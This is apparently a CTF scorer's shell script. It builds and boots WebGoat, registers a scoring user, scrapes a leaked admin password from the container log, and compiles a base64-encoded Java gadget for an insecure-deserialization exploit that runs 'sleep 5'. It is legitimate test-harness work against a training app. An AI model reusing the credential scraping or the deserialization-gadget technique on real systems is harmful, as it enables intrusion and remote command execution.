# scorer/entrypoints/webgoat.sh
# WebGoat bring-up. Sourced by entrypoint.sh.
#
# Same three-branch shape as the other HTTP targets — APP_IMAGE if it is set,
# else the contestant's checked-out fork behind a workspace Dockerfile, else
# exit non-zero — but the source branch is not a one-line `docker build`:
#
#   * WebGoat's root Dockerfile is RUNTIME-ONLY. It `COPY target/webgoat-*.jar`,
#     so the jar has to exist BEFORE the image build; a bare `docker build "$SRC"`
#     dies with "COPY failed: no source files were specified". Hence a Maven pass
#     first, then the image.
#   * The source lives inside THIS container's filesystem, but `docker build` and
#     the Maven run happen in SIBLING containers on the host daemon, where a
#     `-v <path>` mount resolves against the HOST and would see nothing of ours.
#     A named volume is the one handoff both sides can reach — the same trick
#     securityshepherd.sh uses, and upstream's own WebGoat bring-up
#     (.github/actions/ctf-score/entrypoints/score-webgoat-challenges.sh).
#   * Neither build sibling joins $NETWORK: they need the internet (Maven) and
#     the named volume, never the app under test or the scorer, so they are
#     started with no --network at all and land on the daemon's default bridge.
#     ($NETWORK is a plain bridge, not --internal — joining it would not have
#     cost them the internet; they stay off it because they have no business
#     there.) Only the app container (below) joins $NETWORK.
#
# The old version of this file hard-required APP_IMAGE, on the theory that a fork's
# Maven build could not fit a runner's budget. That was wrong twice over: upstream's
# own consumer workflow (docs/webgoat-consumer/pull_request_target.yml) Maven-builds
# the PR's jar on a stock runner, and the build measured here is ~60s of Maven plus
# ~5s of image assembly — a two-minute gate end to end, including scoring all 69
# challenges. Scoring a WebGoat contestant's own fork works; see docs/scorer.md.
#
# WebGoat serves under a /WebGoat context path and takes ~60s to become ready.
# It also ships NO default user: the rubric's helpers.js logs in as webgoat/
# webgoat, and without registering that account first, EVERY login-based lesson
# throws before it even attempts its exploit — a top-level exception in every
# child, which would zero the whole target regardless of patch state (the same
# failure shape as the force-exit bug this rubric exists to catch, just from a
# missing account instead of a torn-down child).
#
# WebWolf (the companion callback server some lessons need) shares this same
# container on :9090 — no extra container, just a second URL to export.

# Pinned build toolchain, independent of whatever the runner happens to have:
# WebGoat v2025.3 declares <java.version>23</java.version> and its own runtime
# Dockerfile is FROM eclipse-temurin:23-jdk-noble, so the build JDK matches the
# tree the kit targets rather than tracking latest. The build goes through the
# repo's own ./mvnw wrapper (not a maven: image) because the wrapper pins the
# Maven version the fork expects.
JDK_IMAGE="${WEBGOAT_JDK_IMAGE:-eclipse-temurin:23-jdk-noble@sha256:7cb6c8eff24b3ef437ed54f73d62387ceb74a763f8b76891ce1f37bfd0f23454}"
DOCKER_CLI_IMAGE="docker:27-cli@sha256:851f91d241214e7c6db86513b270d58776379aacc5eb9c4a87e5b47115e3065c"
SRC_VOL="webgoat_src"

if [ -n "${APP_IMAGE:-}" ]; then
  # pins: APP_IMAGE is chosen, and pinned, by whoever passes it in
  docker pull "$APP_IMAGE" >/dev/null
  IMAGE="$APP_IMAGE"
elif [ -f "${GITHUB_WORKSPACE:-/github/workspace}/Dockerfile" ]; then
  SRC="${GITHUB_WORKSPACE:-/github/workspace}"

  # Idempotent re-runs: a previous run that died mid-build leaves the volume behind.
  docker volume rm -f "$SRC_VOL" >/dev/null 2>&1 || true
  docker volume create "$SRC_VOL" >/dev/null

  echo "webgoat: staging the PR workspace source ($SRC)…"
  tar --exclude=./.git -C "$SRC" -cf - . \
    | docker run --rm -i -v "$SRC_VOL":/src -w /src alpine:3.24.2@sha256:294b683cb724975bec92580e1e685676bd4b50bda910ddb8c51d4cabeaec77e6 tar -xf - \
    || { echo "webgoat: staging the workspace source FAILED" >&2; exit 1; }

  # Output is buffered and replayed only on failure: a green Maven run is a couple
  # of thousand lines of dependency downloads that bury the scoring log, and the
  # tail on failure is what an organizer actually needs.
  echo "webgoat: building the jar (Maven)…"
  # pins: JDK_IMAGE is digest-pinned where it is set, above
  docker run --rm -v "$SRC_VOL":/src -w /src "$JDK_IMAGE" \
    ./mvnw -B clean package -DskipTests >/tmp/webgoat-maven.log 2>&1 || {
    echo "webgoat: Maven build FAILED" >&2
    tail -60 /tmp/webgoat-maven.log >&2
    docker volume rm -f "$SRC_VOL" >/dev/null 2>&1 || true
    exit 1
  }

  # The image build runs in a docker-CLI sibling holding BOTH the source volume and
  # the socket: it reads the context (now including target/) from the volume and
  # streams it to the host daemon.
  echo "webgoat: building the app image…"
  # pins: DOCKER_CLI_IMAGE is digest-pinned where it is set, above
  docker run --rm -v "$SRC_VOL":/src -v /var/run/docker.sock:/var/run/docker.sock -w /src \
    "$DOCKER_CLI_IMAGE" docker build -t ctf-app-under-test . >/tmp/webgoat-image.log 2>&1 || {
    echo "webgoat: app image build FAILED" >&2
    tail -40 /tmp/webgoat-image.log >&2
    docker volume rm -f "$SRC_VOL" >/dev/null 2>&1 || true
    exit 1
  }

  # The image carries the jar now — free the disk.
  docker volume rm -f "$SRC_VOL" >/dev/null 2>&1 || true
  # pins: built locally from the PR checkout, never pulled
  IMAGE=ctf-app-under-test
else
  echo "webgoat: need APP_IMAGE or a workspace Dockerfile" >&2
  exit 1
fi

# pins: the app under test: APP_IMAGE, or an image built from the PR checkout
docker run -d --rm \
  --network "$NETWORK" \
  --network-alias "$APP_HOST" \
  --name "$APP_CONTAINER" \
  -e WEBGOAT_HOST=0.0.0.0 \
  -e WEBGOAT_PORT=8080 \
  "$IMAGE" >/dev/null
BOOTED="$APP_CONTAINER"

export WEBWOLF_URL="http://$APP_HOST:9090/WebWolf"

echo "webgoat: waiting for the app, then registering the scoring user…"
APP_URL="$APP_URL" WEBWOLF_URL="$WEBWOLF_URL" node -e '
  const B = process.env.APP_URL;
  const W = process.env.WEBWOLF_URL;
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
  const get = (u, o = {}) => fetch(u, { redirect: "manual", signal: AbortSignal.timeout(8000), ...o });
  (async () => {
    let up = false;
    for (let i = 0; i < 60; i++) {
      try {
        if ((await get(B + "/login")).ok) { up = true; console.log("WebGoat ready after " + i + " attempt(s)"); break; }
      } catch {}
      await sleep(2000);
    }
    if (!up) { console.error("WebGoat never served /login"); process.exit(2); }

    // Idempotent: 200 (already exists) or 302 (created) are both fine.
    const body = new URLSearchParams({ username: "webgoat", password: "webgoat", matchingPassword: "webgoat", agree: "agree" });
    const reg = await get(B + "/register.mvc", { method: "POST", headers: { "content-type": "application/x-www-form-urlencoded" }, body: body.toString() });
    console.log("register.mvc -> " + reg.status);

    // register.mvc never throws on a bad response (fetch does not throw on non-2xx),
    // so a silent form/behaviour change upstream — an added CSRF field, a transient
    // 5xx, whatever — would otherwise log a status and fall through here believing
    // bring-up succeeded. Close the loop instead: prove the account can actually log
    // in, since every one of the 12 test files throws at loginWebGoat() before
    // registering a single test if it cannot. A silent failure here is the exact
    // vacuous zero this check exists to rule out — clean-looking 0/69, no non-zero
    // exit, no error line anywhere.
    const jar = new Map();
    const addCookies = (r) => { for (const h of r.headers.getSetCookie()) { const p = h.split(";")[0], i = p.indexOf("="); if (i > 0) jar.set(p.slice(0, i).trim(), p.slice(i + 1).trim()); } };
    const cookieHeader = () => [...jar].map(([k, v]) => k + "=" + v).join("; ");

    const loginGet = await get(B + "/login"); addCookies(loginGet);
    const loginPost = await get(B + "/login", {
      method: "POST",
      headers: { "content-type": "application/x-www-form-urlencoded", cookie: cookieHeader() },
      body: new URLSearchParams({ username: "webgoat", password: "webgoat" }).toString(),
    });
    addCookies(loginPost);
    const reportcard = await get(B + "/service/reportcard.mvc", { headers: { cookie: cookieHeader() } });
    const loggedIn = (loginPost.status === 302 || loginPost.status === 200) && reportcard.status === 200 && jar.has("JSESSIONID");
    if (!loggedIn) {
      // String concatenation, not a JS template literal: a dollar-brace placeholder
      // inside these single quotes reads as an unexpanded shell variable to every
      // human and to shellcheck (SC2016).
      console.error("webgoat: scoring user cannot log back in after registration (login=" + loginPost.status +
        " reportcard=" + reportcard.status + ") — refusing to hand off to the judge");
      process.exit(3);
    }
    console.log("webgoat: scoring user verified (register + login + reportcard all healthy)");

    for (let i = 0; i < 30; i++) {
      try {
        const r = await get(W + "/");
        if (r.status === 200 || r.status === 302) { console.log("WebWolf ready"); process.exit(0); }
      } catch {}
      await sleep(2000);
    }
    console.log("webgoat: WebWolf never answered — lessons that depend on it will fail to exploit.");
  })();
'

# Two lessons are not scored over HTTP: Log-Injection-Bleeding (Challenge-72) replays
# the admin password WebGoat logs at startup, and Insecure-Deserialization
# (Challenge-74) needs a gadget built against the exact class in the running jar.
# misc-lessons.test.js reads WEBGOAT_LEAKED_ADMIN_PW / WEBGOAT_DESER_PAYLOAD directly:
# an EMPTY value means "the exploit can't proceed -> patched" (an intentional early
# pass on a hardened app); an ABSENT one falls back to `docker ps --filter
# publish=8080`, which finds nothing here (this bring-up publishes no host port) and
# permanently fails both challenges regardless of patch state. So both are gathered
# here, over docker.sock, while the app is known-good, and ALWAYS exported — empty
# only when the recon genuinely finds nothing. Distilled from upstream's same
# bring-up script (score-webgoat-challenges.sh), substituting $APP_CONTAINER for its
# $APP_NAME. Both hold on a source-built image too: the fork's own Dockerfile lands
# the jar at the same /home/webgoat/webgoat.jar this recon reads.
#
# Assigned, then exported: `export X="$(…)"` masks the command substitution's exit
# status behind export's own (shellcheck SC2155), which here would hide a failing
# `docker logs` / `docker exec` behind a silently empty value — and an empty value
# is exactly what this file reads as "patched".
LEAK_B64="$(docker logs "$APP_CONTAINER" 2>&1 | grep -oE 'Password for admin: *[A-Za-z0-9+/=]{20,}' | tail -1 | sed 's/.*: *//' || true)"
WEBGOAT_LEAKED_ADMIN_PW="$(printf '%s' "$LEAK_B64" | base64 -d 2>/dev/null || true)"
export WEBGOAT_LEAKED_ADMIN_PW
if [ -n "$WEBGOAT_LEAKED_ADMIN_PW" ]; then
  echo "webgoat: recovered the leaked admin password from the container log"
else
  echo "webgoat: no admin password in the log — Challenge-72 scores as patched"
fi

GENB64='aW1wb3J0IGphdmEuaW8uKjsgaW1wb3J0IGphdmEudXRpbC5CYXNlNjQ7IGltcG9ydCBvcmcuZHVtbXkuaW5zZWN1cmUuZnJhbWV3b3JrLlZ1bG5lcmFibGVUYXNrSG9sZGVyOwpwdWJsaWMgY2xhc3MgR2VuIHsgcHVibGljIHN0YXRpYyB2b2lkIG1haW4oU3RyaW5nW10gYSkgdGhyb3dzIEV4Y2VwdGlvbiB7CiAgVnVsbmVyYWJsZVRhc2tIb2xkZXIgdCA9IG5ldyBWdWxuZXJhYmxlVGFza0hvbGRlcigiZGVsZXRlIiwgInNsZWVwIDUiKTsKICBCeXRlQXJyYXlPdXRwdXRTdHJlYW0gYiA9IG5ldyBCeXRlQXJyYXlPdXRwdXRTdHJlYW0oKTsKICBPYmplY3RPdXRwdXRTdHJlYW0gbyA9IG5ldyBPYmplY3RPdXRwdXRTdHJlYW0oYik7IG8ud3JpdGVPYmplY3QodCk7IG8uZmx1c2goKTsKICBTeXN0ZW0ub3V0LnByaW50bG4oQmFzZTY0LmdldEVuY29kZXIoKS5lbmNvZGVUb1N0cmluZyhiLnRvQnl0ZUFycmF5KCkpKTsgfSB9'
WEBGOAT_DESER_PAYLOAD="$(docker exec -e GENB64="$GENB64" "$APP_CONTAINER" sh -c 'cd /tmp && rm -rf wgd && mkdir wgd && cd wgd && jar xf /home/webgoat/webgoat.jar BOOT-INF/classes/org/dummy/insecure/framework/VulnerableTaskHolder.class 2>/dev/null; SLF4J=$(jar tf /home/webgoat/webgoat.jar | grep -i slf4j-api | head -1); jar xf /home/webgoat/webgoat.jar "$SLF4J" 2>/dev/null; CP="BOOT-INF/classes:$SLF4J"; echo "$GENB64" | base64 -d > Gen.java; javac -cp "$CP" Gen.java 2>/dev/null; java -cp "$CP:." Gen 2>/dev/null' 2>/dev/null | tail -1 || true)"
export WEBGOAT_DESER_PAYLOAD
if [ -n "$WEBGOAT_DESER_PAYLOAD" ]; then
  echo "webgoat: built the deserialization gadget from the running jar"
else
  echo "webgoat: could not build the gadget — Challenge-74 scores as patched"
fi
